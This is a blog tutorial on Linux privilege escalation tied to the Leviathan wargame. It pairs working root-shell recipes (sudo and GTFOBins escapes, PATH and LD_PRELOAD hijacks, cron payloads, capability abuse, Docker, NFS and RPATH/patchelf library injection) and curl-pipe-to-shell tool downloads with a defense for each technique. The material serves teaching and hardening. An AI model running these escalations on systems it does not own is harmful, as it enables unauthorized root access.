---
layout: post-with-comments
title: "Linux Privilege Escalation, Deep Dive: Techniques, Labs, Defenses, and Leviathan Tie-ins"
permalink: /posts/linux-privilege-escalation-leviathan/
redirect_from:
  - /posts/linux-privilege-escalation-Leviathan/
  - /posts/linux-priv-esc-end-to-end/
tags: [linux, privilege-escalation, ctf, leviathan, suid, capabilities, path, env, cron, kernel, defenders]
description: "Hands-on Linux privilege escalation: quick wins, systematic enum, exploit classes, labs, and defenses — mapped to OverTheWire Leviathan."
excerpt_separator: <!--more-->
---

<!-- Scoped styles & helpers JUST for this post -->
<style>
iframe[src*="youtube.com"], iframe[src*="youtu.be"], iframe[src*="vimeo.com"]{
  display:block; width:100% !important; max-width:100%; height:auto; aspect-ratio:16/9; border:0;
}
.md-table table{width:100%; border-collapse:separate; border-spacing:0;}
.md-table th,.md-table td{padding:.65rem .85rem; vertical-align:top;}
.md-table thead th{border-bottom:1px solid rgba(255,255,255,.15);}
.md-table tbody tr+tr td{border-top:1px dashed rgba(255,255,255,.12);}
kbd{background:#eee;border:1px solid #ccc;border-bottom:2px solid #bbb;padding:0 .35em;border-radius:3px;}
.note{background:rgba(255,255,0,.12); padding:.35rem .55rem; border-radius:6px}
.tip{background:rgba(0,255,170,.08); padding:.35rem .55rem; border-radius:6px}
.copy-btn{position:absolute; top:.45rem; right:.45rem; font-size:.8rem; padding:.25rem .5rem; border:1px solid rgba(255,255,255,.2); border-radius:6px; cursor:pointer; background:rgba(255,255,255,.04)}
pre{position:relative}
/* Do not show any explicit text about opening new tabs */
a[data-ext="1"]{ }
.table-scroll{overflow-x:auto}

/* Printable checklist (Appendix D) */
@media print {
  body * { visibility: hidden; }
  #defense-checklist, #defense-checklist * { visibility: visible; }
  #defense-checklist { position: absolute; left: 0; top: 0; width: 100%; }
  .no-print { display:none !important; }
}
.print-card table { width:100%; border-collapse:separate; border-spacing:0; }
.print-card th,.print-card td{ padding:.55rem .7rem; vertical-align:top; }
.print-card thead th{ border-bottom:1px solid rgba(255,255,255,.18); }
.print-card tbody tr+tr td{ border-top:1px dashed rgba(255,255,255,.12); }
</style>

<script>
// Open external absolute URLs in a new tab (no visible "open in new tab" text)
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('a[href^="http"]').forEach(a=>{
    a.setAttribute('target','_blank');
    a.setAttribute('rel','noopener noreferrer');
    a.dataset.ext="1";
  });

  // Copy buttons for all fenced code blocks
  document.querySelectorAll('pre > code').forEach(code=>{
    const btn = document.createElement('button');
    btn.className = 'copy-btn';
    btn.textContent = 'Copy';
    btn.addEventListener('click', async () => {
      try {
        await navigator.clipboard.writeText(code.innerText);
        btn.textContent = 'Copied!';
        setTimeout(()=>btn.textContent='Copy', 1200);
      } catch(e){ btn.textContent = 'Oops'; setTimeout(()=>btn.textContent='Copy', 1200); }
    });
    code.parentElement.appendChild(btn);
  });
});
</script>

# Linux Privilege Escalation, Deep Dive

**Privilege Escalation (PrivEsc)** turns a low-priv foothold into higher privileges (often `root`). This long-form tutorial is **hands-on** and **pattern-driven**: it teaches how to **enumerate, hypothesize, verify, exploit, document, and defend**. We’ll cover **SUID/SGID**, **sudo misconfigs**, **PATH/LD tricks**, **cron/timers**, **Linux capabilities**, **NFS `no_root_squash`**, **containers/Docker**, and a **Kubernetes/RBAC** sidebar. You’ll also get **mini-labs** to internalize each idea and a **non-spoiler** mapping to **OverTheWire Leviathan**.

![Sui]({{ '/assets/images/privilege-escalation/sui.gif' | relative_url }})

If you’re following my CTF series, start here: **[OverTheWire — Leviathan Overview]({{ '/posts/overthewire/leviathan-overview/' | relative_url }})**.

<!--more-->

---

## Table of Contents
- [1) Mindset & quick wins](#sec-mindset)
- [2) Enumeration that matters (manual + automated)](#sec-enum)
- [3) Common escalation paths](#sec-paths)
  - [3.1 SUID/SGID binaries](#sec-suid)
  - [3.2 Misconfigured sudo (sudoers/env)](#sec-sudo)
  - [3.3 PATH hijacking & world-writable dirs](#sec-path)
  - [3.4 LD\_PRELOAD / library search path pitfalls](#sec-ld)
  - [3.5 Cron jobs, timers & writable scripts](#sec-cron)
  - [3.6 Linux Capabilities](#sec-caps)
  - [3.7 NFS (`no_root_squash`) & file mounts](#sec-nfs)
  - [3.8 Containers & the `docker` group](#sec-containers)
  - [3.9 Kernel exploits (last resort)](#sec-kernel)
- [4) Watching the box live with pspy](#sec-pspy)
- [5) A production workflow / checklist](#sec-workflow)
- [6) Defending against these issues](#sec-defense)
- [7) Leviathan tie-ins: habits you practiced](#sec-leviathan)
- [Appendix A — One-liners & snippets](#appendix-a)
- [Appendix B — Extended mini-labs (safe, local)](#appendix-b)
- [Appendix C — Containers & Kubernetes deep dive](#appendix-c)
- [Appendix D — Defensive checklist (printable)](#appendix-d)
- [Resource Library (Videos & Reading)](#resources)

---

<a id="sec-mindset"></a>
## 1) Mindset & quick wins

- **Enumerate first, escalate second.** PrivEsc is pattern recognition: permissions, ownership, environment, scheduling, and file paths.
- **Prefer intended misconfig over 0-day.** Sudo rules, SUID wrappers, writable cron, sloppy PATH are the real workhorses.
- **Exploit safely & document.** Record exact commands, versions, timestamps, and remediation advice.

**Orientation video:**  
*Linux Privilege Escalation — Full Course (comprehensive survey)*  
<iframe src="https://www.youtube.com/embed/5Un3ffzokJQ" title="Linux Privilege Escalation – Full Course"></iframe>

**Further references:**  
- *Basic Linux Privilege Escalation* — g0tmi1k  
- *HackTricks: Linux PrivEsc* — encyclopedic tactics & checks

---

<a id="sec-enum"></a>
## 2) Enumeration that matters (manual + automated)

Start with identity, platform, and obvious footholds:

```bash
id; whoami
uname -a
lsb_release -a 2>/dev/null || cat /etc/*release
sudo -l
cat /etc/passwd | cut -d: -f1 | sort | uniq
env | sort
````

Hunt likely vectors:

```bash
# SUID/SGID
find / -perm -u=s -type f -exec ls -al {} + 2>/dev/null
find / -perm -g=s -type f -exec ls -al {} + 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron & timers
ls -al /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null | sed -n '1,20p'

# Writable dirs
find / -writable -type d 2>/dev/null | head -n 50
```

Then use automation for breadth:

* **linPEAS (PEASS-ng)** — triage sudo/SUID/cron/caps/NFS/docker fast.

  ```bash
  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
  ```
* **LinEnum** — a classic scripted enumerator.

**Further references:**

* PEASS-ng (linPEAS) • LinEnum • HackTricks Linux PrivEsc

---

<a id="sec-paths"></a>

## 3) Common escalation paths

Each subsection explains detection → exploitation pattern → defense. Try the matching **mini-lab** in [Appendix B](#appendix-b).

<a id="sec-suid"></a>

### 3.1 SUID/SGID binaries

**Find them**:

```bash
find / -perm -4000 -type f -printf "%M %u %g %p\n" 2>/dev/null | sort
find / -perm -2000 -type f -printf "%M %u %g %p\n" 2>/dev/null | sort
```

**Exploit ideas**:

* SUID **LOLBins** (legit tools) with shell escapes: `find`, `vim`, `less`, `awk`, `tar`, `cpio`, etc. See **GTFOBins**.
* Custom SUID helpers calling `system("…")` without absolute paths → **PATH hijack**.

**Defense**: minimize SUID; prefer capabilities or dedicated service accounts; code with absolute paths and drop privileges early.

**Further references:**

* GTFOBins (SUID/sudo columns) • “SetUID Demystified” style posts

---

<a id="sec-sudo"></a>

### 3.2 Misconfigured sudo (sudoers/env)

**Check**:

```bash
sudo -l
```

**Look for**:

* `NOPASSWD:` on powerful tools (editors/interpreters/archivers).
* `SETENV` + `env_keep=LD_PRELOAD/LD_LIBRARY_PATH` (dangerous).
* Loose globs and wildcards (`*`) enabling argument/file injection.

**Sketch**:

```bash
# Allowed: sudo vim
sudo vim -c ':!/bin/sh'   # or GTFOBins' exact recipe
```

**Defense**: least privilege; audit rules; avoid wildcards; set `env_reset` and `secure_path`; pin absolute paths.

**Further references:**

* `sudoers(5)` man page • GTFOBins recipes for allowed binaries

---

<a id="sec-path"></a>

### 3.3 PATH hijacking & world-writable dirs

If a root/SUID/sudoed script calls `tar` instead of `/bin/tar`, and you control an **earlier dir in `$PATH`**, drop a look-alike.

**Sketch**:

```bash
echo -e '#!/bin/sh\n/bin/sh -p' > /tmp/tar && chmod +x /tmp/tar
export PATH="/tmp:$PATH"
sudo /path/to/poorly_written_script
```

**Defense**: absolute paths; sanitized env; `secure_path` in sudoers; immutable deployment paths.

**Further references:**

* PATH hijack writeups • `sudoers(5)` (`secure_path`)

---

<a id="sec-ld"></a>

### 3.4 LD\_PRELOAD / library search path pitfalls

If a sudo rule preserves `LD_PRELOAD` (via `env_keep`) or a root binary loads from a writable **rpath/runpath**, you can inject a shared object.

**Sketch**:

```c
// /tmp/x.c
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void init(){ setuid(0); system("/bin/sh -p"); }
```

```bash
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <allowed-command>   # only if rule allows
```

**Defense**: disallow env injection; build with secure rpath; run as dedicated users with locked-down env.

**Video (focused demo):**
*Sudo + LD\_PRELOAD privilege escalation*

<iframe src="https://www.youtube.com/embed/bzjnIi5u9OQ" title="Sudo + LD_PRELOAD demo"></iframe>

**Further references:**

* LD\_PRELOAD abuse articles • `ld.so` manual

---

<a id="sec-cron"></a>

### 3.5 Cron jobs, timers & writable scripts

**Hunt**:

```bash
ls -al /etc/cron* /var/spool/cron 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

**Pattern**: root cron calls a **writable** script or sources a writable file → append payload.

**Sketch**:

```bash
echo 'cp /bin/bash /tmp/rbash; chmod +s /tmp/rbash' >> /path/to/writable.sh
# wait for cron...
/tmp/rbash -p
```

**Defense**: root cron points to immutable paths; scripts root-owned; code reviews for `source`/`.` usage.

**Further references:**

* linPEAS/LinEnum cron checks • systemd hardening (`NoNewPrivileges`, `ProtectSystem`)

---

<a id="sec-caps"></a>

### 3.6 Linux Capabilities

**Find file caps**:

```bash
getcap -r / 2>/dev/null
```

**High-risk**: `cap_setuid+ep` on interpreters; `cap_dac_read_search+ep` on file browsers; very broad `cap_sys_admin+ep`.

**Sketch**:

```bash
# If python3 has cap_setuid+ep:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

**Defense**: strip caps from general tools; use tiny, auditable helpers with least capabilities.

**Further references:**

* `capabilities(7)` • vendor docs (capability overview)

---

<a id="sec-nfs"></a>

### 3.7 NFS (`no_root_squash`) & file mounts

`no_root_squash` lets client root act as root on server exports — enabling planting SUID files.

**Recon**:

```bash
showmount -e <nfs_server>
mount -t nfs <nfs_server>:/export /mnt
```

**Defense**: prefer `root_squash`/`all_squash`; Kerberos auth; strict export options.

**Video (explainer):**
*NFS no\_root\_squash misconfiguration*

<iframe src="https://www.youtube.com/embed/vnB7aDzcScg" title="NFS no_root_squash explained"></iframe>

**Further references:**

* `exports(5)` • vendor hardening notes

---

<a id="sec-containers"></a>

### 3.8 Containers & the `docker` group

Membership in `docker` usually implies host privesc (bind mount `/` and chroot):

```bash
docker run -v /:/host -it --rm alpine chroot /host /bin/sh
```

**Defense**: don’t grant `docker` lightly; rootless Docker; drop capabilities; protect `/var/run/docker.sock`.

**Video (demo):**
*Privilege Escalation via Docker group*

<iframe src="https://www.youtube.com/embed/pRBj2dm4CDU" title="Docker group privesc"></iframe>

**Further references:**

* Container escape posts • Docker hardening guides

---

<a id="sec-kernel"></a>

### 3.9 Kernel exploits (**last resort**)

If configs fail and kernel is vulnerable, a 1-day LPE may work — but it’s noisier and riskier. Prefer targeted, auditable PoCs; log everything; clean up.

**Further references:**

* Vendor advisories • well-reviewed CVE writeups (use in labs, not prod)

---

<a id="sec-pspy"></a>

## 4) Watching the box live with pspy

**pspy** lists new processes without root — perfect to catch cron/timers/services in real time.

```bash
# Kali (manual download shown; prefer distro package if available):
wget -qO pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

**Further references:**

* pspy GitHub • distro package pages

---

<a id="sec-workflow"></a>

## 5) A production workflow / checklist

1. **Baseline**: `id`, `sudo -l`, OS, users, groups, mounts, services.
2. **Automation**: run linPEAS/LinEnum in parallel; skim findings.
3. **Triage**: Sudo → SUID → Writable paths → Cron → Capabilities → NFS → Containers → Kernel.
4. **Minimal PoC**: prove impact with least destructive steps.
5. **Evidence**: commands, outputs, perms, timestamps, fix.
6. **Cleanup**: restore env/paths; remove artifacts.

**Further references:**

* “Privilege Escalation playbooks” posts • incident reporting templates

---

<a id="sec-defense"></a>

## 6) Defending against these issues

* **Sudoers**: least privilege; avoid wildcards; `env_reset`, `secure_path`, `!SETENV`, absolute paths.
* **SUID**: audit/remove; prefer capabilities; `nosuid` mount when feasible.
* **Cron**: immutable paths, strict ownership/permissions; avoid sourcing writable files.
* **Capabilities**: no “general tools” with strong caps; dedicated helpers only.
* **NFS**: avoid `no_root_squash`; strong auth; read-only where possible.
* **Containers**: restrict `docker` group; rootless engines; drop capabilities; AppArmor/SELinux profiles.
* **Monitoring**: watch for unexpected SUID changes, new timers, capability grants.

**Further references:**

* `sudoers(5)` • `capabilities(7)` • NFS exports docs • Docker hardening checklists

---

<a id="sec-leviathan"></a>

## 7) Leviathan tie-ins: habits you practiced (non-spoiler)

Leviathan trains the exact instincts you need:

* **Read perms & ownership** carefully (files, dirs, binaries).
* **Trace helpers** used by small SUID wrappers (`strings`, `ltrace`, `strace`).
* **Think environment**: `$PATH`, `LD_*`, working directory.
* **Look for scheduling** hooks (cron/timers) and **misplaced secrets**.
* **Prefer clean misconfig** over brittle exploit chains.

**My series hub:** \[OverTheWire — Leviathan Overview]\({{ '/posts/overthewire/leviathan-overview/' | relative_url }})

---

<a id="appendix-a"></a>

## Appendix A — One-liners & snippets

**SUID sweep + metadata**

```bash
find / -perm -4000 -type f -printf "%M %u %g %p\n" 2>/dev/null | sort
```

**Capabilities sweep**

```bash
getcap -r / 2>/dev/null
```

**Writable dirs earlier in PATH**

```bash
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "writable: $d"; done
```

**Cron scrape**

```bash
for f in /etc/crontab /etc/cron.*/* /var/spool/cron/*; do [ -e "$f" ] && ls -al "$f"; done 2>/dev/null
```

**linPEAS (lab only)**

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**pspy quick run**

```bash
wget -qO pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

---

<a id="appendix-b"></a>

## Appendix B — Extended mini-labs (safe, local)

> **Lab safety**: do these on a disposable VM you own.

### Lab B1 — Sudo env pitfalls (`env_keep` vs `secure_path`)

```bash
# 1) Create a harmless command in a writable dir:
mkdir -p /tmp/wh && printf '#!/bin/sh\necho PWNED\n' > /tmp/wh/wh
chmod +x /tmp/wh/wh

# 2) Prepend PATH and run a sudo-allowed script that calls 'wh' without absolute path:
export PATH="/tmp/wh:$PATH"
sudo /path/to/allowed/script   # if sudoers uses secure_path, your PATH is ignored

# Observe behavior; compare with/without 'secure_path' & 'env_reset' in sudoers (lab system).
```

**What you learn**: why `secure_path` and `env_reset` matter.

---

### Lab B2 — GTFOBins trio: `less`, `tar`, `awk` under SUID/sudo

```bash
# less (shell escape; method may vary by version)
sudo less /etc/hosts
# Inside less, try:  !/bin/sh

# tar (trigger command via checkpoint; check GTFOBins for your version)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# awk (execute command)
sudo awk 'BEGIN { system("/bin/sh") }'
```

**What you learn**: how “legit” tools become shells when misconfigured.

---

### Lab B3 — PATH hijack of a sloppy SUID helper

```c
// helper.c — DEMO ONLY, DO NOT DEPLOY SUID LIKE THIS
#include <stdlib.h>
int main(){ system("cp /etc/hosts /tmp/hosts.copy"); return 0; }
```

```bash
gcc helper.c -o helper
sudo chown root:root helper && sudo chmod 4755 helper

# Attacker
mkdir -p /tmp/p && cd /tmp/p
printf '#!/bin/sh\n/bin/sh -p\n' > cp; chmod +x cp
export PATH="/tmp/p:$PATH"
/path/to/helper
```

**What you learn**: why absolute paths matter in SUID code.

---

### Lab B4 — LD\_PRELOAD via sudo `env_keep`

```c
// x.c — run a root shell when preloaded (lab)
#include <stdlib.h>
__attribute__((constructor)) void boom(){ setuid(0); system("/bin/sh -p"); }
```

```bash
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <allowed-command>   # only if env_keep allows
```

**What you learn**: the risk of preserving LD vars.

---

### Lab B5 — Docker group escalation

```bash
# If your user is in the docker group:
docker run --rm -it -v /:/host alpine chroot /host /bin/sh
```

**What you learn**: why `docker` ≈ root.

---

### Lab B6 — NFS `no_root_squash`

```bash
# server: /etc/exports contains  /export *(rw,no_root_squash)
# client:
mount -t nfs server:/export /mnt
cp /bin/bash /mnt/bash-root && chmod +s /mnt/bash-root
# back on server, /export/bash-root will be SUID-root; executing there gives a root shell (lab context).
```

**What you learn**: cross-host trust pitfalls.

---

### Lab B7 — RPATH/RUNPATH hijack with `$ORIGIN` (no binary patch)

> Goal: demonstrate how a **writable library path** in `RPATH/RUNPATH` lets you inject a malicious `.so`.
> ⚠️ **Lab-only**: We’ll set SUID on a toy binary we own to simulate risk. Do not deploy such binaries.

```c
/* libvictim.c (benign) */
#include <stdio.h>
void victim(void){ puts("victim: benign"); }
```

```c
/* vuln.c — links to libvictim.so via RPATH=$ORIGIN/libs */
extern void victim(void);
int main(){ victim(); return 0; }
```

```bash
# Build benign lib + binary
mkdir -p /tmp/rpathdemo/libs && cd /tmp/rpathdemo
cat > libvictim.c <<'EOF'
#include <stdio.h>
void victim(void){ puts("victim: benign"); }
EOF
cat > vuln.c <<'EOF'
extern void victim(void);
int main(){ victim(); return 0; }
EOF

gcc -fPIC -shared -Wl,-soname,libvictim.so -o libs/libvictim.so libvictim.c
gcc vuln.c -L./libs -lvictim -Wl,-rpath,'$ORIGIN/libs' -o vuln

# Lab-only: simulate an unsafe deployment (SUID in attacker-writable dir)
sudo chown root:root vuln && sudo chmod 4755 vuln

# Confirm normal behavior:
./vuln
# -> prints: victim: benign

# Replace the library with a malicious one:
cat > libs/libvictim.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void victim(void){
  setgid(0); setuid(0);
  system("/bin/sh -p -c 'echo [*] escalated; id; /bin/sh -p'");
}
EOF
gcc -fPIC -shared -Wl,-soname,libvictim.so -o libs/libvictim.so libs/libvictim.c

# Run the SUID binary again (loads our lib via RPATH $ORIGIN/libs):
./vuln
```

**Inspectors**

```bash
objdump -p ./vuln | grep -E 'RPATH|RUNPATH'
readelf -d ./vuln | egrep 'RPATH|RUNPATH'
ldd ./vuln
```

---

### Lab B8 — `patchelf` hijack: set/replace `RPATH` and `NEEDED`

> Goal: understand how **binary patching** can redirect the loader to our `.so`.
> ⚠️ If you can **modify a SUID binary**, you already have powerful control — treat this as forensics/CI hardening knowledge.

```bash
# Install patchelf (Debian/Ubuntu/Kali)
sudo apt update && sudo apt install -y patchelf
```

Re-use `./vuln` from Lab B7 (currently with `RPATH=$ORIGIN/libs`).

**A) Repoint RPATH at a new directory you control**

```bash
mkdir -p /tmp/rpathdemo/bad
patchelf --print-rpath ./vuln
patchelf --set-rpath '$ORIGIN/bad' ./vuln
patchelf --print-rpath ./vuln   # should show $ORIGIN/bad

# Drop a malicious lib with the same SONAME:
cat > bad/libvictim.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void victim(void){ setuid(0); setgid(0); system("/bin/sh -p"); }
EOF
gcc -fPIC -shared -Wl,-soname,libvictim.so -o bad/libvictim.so bad/libvictim.c

./vuln   # loads bad/libvictim.so via new RPATH
```

**B) Add a dependency (`NEEDED`) that pops a shell on load**

```bash
patchelf --print-needed ./vuln

cat > bad/libx.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void boom(){ setuid(0); setgid(0); system("/bin/sh -p"); }
EOF
gcc -fPIC -shared -Wl,-soname,libx.so -o bad/libx.so bad/libx.c

# Ensure RPATH includes $ORIGIN/bad, then:
patchelf --add-needed libx.so ./vuln
patchelf --print-needed ./vuln

./vuln   # loads libx.so alongside normal deps -> root shell (lab)
```

**C) Swap one library for another**

```bash
# If original had libvictim.so:
patchelf --replace-needed libvictim.so libx.so ./vuln
patchelf --print-needed ./vuln
./vuln
```

**Defensive notes**

* Never deploy SUID in writable dirs; avoid `$ORIGIN` pointing into writable paths.
* Vendors should ship **immutable, root-owned library trees** only.
* Verify `RPATH/RUNPATH/NEEDED` in CI; both RPATH and RUNPATH are dangerous if they include writable dirs.

**Inspectors**

```bash
objdump -p ./vuln | grep -E 'RPATH|RUNPATH|NEEDED'
readelf -d ./vuln | egrep 'RPATH|RUNPATH'
```

---

<a id="appendix-c"></a>

## Appendix C — Containers & Kubernetes deep dive

### C1) Linux capabilities in containers (why escapes work)

* Default Docker adds some capabilities; **privileged** adds many back.
* If container can access the Docker socket or host mounts (`-v /:/host`), host privesc is near-trivial.

**Checklist**

```bash
# Inside container:
cat /proc/self/status | grep Cap
ls -l /var/run/docker.sock 2>/dev/null
mount | head
```

**Defense**: drop caps (`--cap-drop=ALL` + add back needed), seccomp/AppArmor/SELinux, rootless, avoid mounting sensitive host paths.

---

### C2) Kubernetes RBAC & ServiceAccount tokens (quick mental model)

* Pods mount a ServiceAccount token; with broad RBAC (list secrets, create pods), an attacker can escalate or spawn privileged pods.

**Recon (inside a pod)**

```bash
# If kubectl + creds exist:
kubectl auth can-i --list

# Raw API probe with the token:
curl -sS --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api
```

**Defense**: least-privilege RBAC, block hostPath, disallow `privileged`, admission policies (PSA), short-lived tokens, workload identity.

**Further references:**

* Docker/K8s hardening guides • NSA/CISA Kubernetes hardening doc

---

<a id="appendix-d"></a>

## Appendix D — Defensive checklist (printable)

<button class="no-print" onclick="window.print()" style="margin:.5rem 0; padding:.4rem .7rem; border-radius:6px;">
  Print checklist
</button>

<section id="defense-checklist" class="print-card">
  <h3>Linux Privilege Escalation — Defensive Checklist</h3>
  <div class="md-table table-scroll">
    <table>
      <thead>
        <tr>
          <th>Area</th>
          <th>What to check</th>
          <th>Remediation / Hardening</th>
          <th>Tools</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td>Sudoers</td>
          <td>Wildcards, NOPASSWD on powerful tools, SETENV / env_keep rules</td>
          <td>Least privilege; remove wildcards; enforce <code>env_reset</code> &amp; <code>secure_path</code>; absolute paths</td>
          <td><code>sudo -l</code>, policy audits, CI review</td>
        </tr>
        <tr>
          <td>SUID/SGID</td>
          <td>Unexpected SUID/SGID binaries; LOLBins with shell escapes</td>
          <td>Remove non-essential SUID/SGID; consider <code>nosuid</code> mounts</td>
          <td><code>find / -perm -4000</code>, GTFOBins</td>
        </tr>
        <tr>
          <td>PATH &amp; environment</td>
          <td>Writable dirs early in <code>$PATH</code>; scripts calling non-absolute commands</td>
          <td>Use absolute paths; sanitize env; <code>secure_path</code></td>
          <td><code>echo $PATH</code>, code review</td>
        </tr>
        <tr>
          <td>LD / libraries</td>
          <td>RPATH/RUNPATH include writable dirs; odd <code>NEEDED</code> entries</td>
          <td>Immutable library trees; avoid writable <code>$ORIGIN</code>; verify with CI</td>
          <td><code>objdump -p</code>, <code>readelf -d</code>, <code>patchelf</code></td>
        </tr>
        <tr>
          <td>Cron / timers</td>
          <td>Root jobs sourcing or executing writable files/paths</td>
          <td>Root-owned, immutable scripts; review service units; least privilege</td>
          <td><code>systemctl list-timers</code>, <code>crontab -l</code></td>
        </tr>
        <tr>
          <td>Capabilities</td>
          <td>Dangerous caps on general-purpose tools (e.g., <code>cap_setuid</code>)</td>
          <td>Strip caps; use small, purpose-built helpers</td>
          <td><code>getcap -r /</code>, <code>capabilities(7)</code></td>
        </tr>
        <tr>
          <td>NFS</td>
          <td><code>no_root_squash</code> exports; wide client access</td>
          <td>Prefer <code>root_squash</code>/<code>all_squash</code>; Kerberos; RO exports where possible</td>
          <td><code>showmount -e</code>, <code>exports(5)</code></td>
        </tr>
        <tr>
          <td>Containers</td>
          <td>Users in <code>docker</code> group; privileged containers; hostPath mounts</td>
          <td>Restrict group; rootless; drop capabilities; policy/PSA; seccomp/AppArmor/SELinux</td>
          <td>Docker/K8s audits, PSA</td>
        </tr>
        <tr>
          <td>Secrets</td>
          <td>Plaintext creds in home/opt/www; SSH keys; world-readable backups</td>
          <td>Secret management; file perms; scanning in CI</td>
          <td>trufflehog, gitleaks, grep audits</td>
        </tr>
        <tr>
          <td>Monitoring</td>
          <td>Unexpected SUID changes, new timers, capability grants, NFS export edits</td>
          <td>File integrity (AIDE/OSSEC); alert on metadata deltas</td>
          <td>SIEM, auditd, inotify</td>
        </tr>
      </tbody>
    </table>
  </div>
  <p class="note">Tip: bake these checks into CI/CD (build & packaging steps) so binaries ship with correct RPATH/RUNPATH and without dangerous caps/SUID.</p>
</section>

---

<a id="resources"></a>

## Resource Library (Videos & Reading)

### Videos (curated)

* *Linux Privilege Escalation – Full Course* (comprehensive).
* *Sudo + LD\_PRELOAD PrivEsc* (focused env-abuse demo).
* *Privilege Escalation via Docker group* (containers).
* *NFS `no_root_squash` misconfiguration* (storage misconfig).

### Reading / Tools

* **GTFOBins** — abuse recipes for legit Unix tools (SUID/sudo).
* **PEASS-ng / linPEAS** — automated triage.
* **LinEnum** — classic local enumeration.
* **pspy** — process watcher without root.
* **HackTricks: Linux PrivEsc** — exhaustive notes & checklists.
* **Man-pages**: `sudoers(5)` & `capabilities(7)`.
* **NFS** hardening: `exports(5)` + vendor docs.
* **Container hardening**: Docker/K8s best practices.

---

## Final note

Use this as a **playbook**: enumerate broadly, pick the **cleanest misconfig**, verify with the **smallest PoC**, then leave **clear remediation** in your notes. Pair these patterns with your **Leviathan** journey for fast skill compounding.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})  
